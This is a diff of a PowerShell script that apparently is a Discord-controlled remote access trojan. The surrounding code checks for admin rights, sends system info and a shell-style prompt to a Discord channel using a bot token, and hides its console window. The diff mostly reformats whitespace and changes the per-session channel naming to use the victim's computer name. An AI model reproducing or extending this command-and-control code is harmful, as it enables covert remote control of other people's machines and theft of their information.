@@ -1161,6 +1161,7 @@ if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdent
 } else {
     $adminperm = "True"
 }
+
 if ($InfoOnConnect -eq '1'){
     $infocall = ':hourglass: Getting system info - please wait.. :hourglass:'
 }
@@ -1184,14 +1185,15 @@ $infocall
     )
 }
 sendMsg -Embed $jsonPayload
+
     if ($InfoOnConnect -eq '1'){
- 	quickInfo
-  	$dir = $PWD.Path
-	sendMsg -Message "``PS | $dir>``"
+ 	    quickInfo
+  	    $dir = $PWD.Path
+	    sendMsg -Message "``PS | $dir>``"
     }
     else{
-    	$dir = $PWD.Path
-	sendMsg -Message "``PS | $dir>``"w
+        $dir = $PWD.Path
+	    sendMsg -Message "``PS | $dir>``"
     }
 }
 
@@ -1363,25 +1365,8 @@ $headers = @{
 Function NewChannel{
     $script:oldChan = $chan
     $uri = "https://discord.com/api/guilds/$gid/channels"
-    $webClient = New-Object System.Net.WebClient
-    $webClient.Headers.Add("Authorization", "Bot $token")
-    $response = $webClient.DownloadString($uri)
-    $channels = $response | ConvertFrom-Json
-    $topSession = 0
-    
-    foreach ($channel in $channels) {
-        if ($channel.name -match "session-(\d+)") {
-            $sessionNumber = [int]$matches[1]
-            if ($sessionNumber -gt $topSession) {
-                $topSession = $sessionNumber
-            }
-        }
-    }
-    $topSession
-    $newSessionNumber = $topSession + 1;
-    $uri = "https://discord.com/api/guilds/$gid/channels"
     $body = @{
-        "name" = "session-$newSessionNumber"
+        "name" = "session-$env:COMPUTERNAME"
         "type" = 0
     } | ConvertTo-Json
     
@@ -1393,7 +1378,6 @@ Function NewChannel{
     Write-Host "The ID of the new channel is: $($responseObj.id)"
     $script:chan = $responseObj.id
 }
-
 # =============================================================== MAIN LOOP =========================================================================
 
 HideConsole
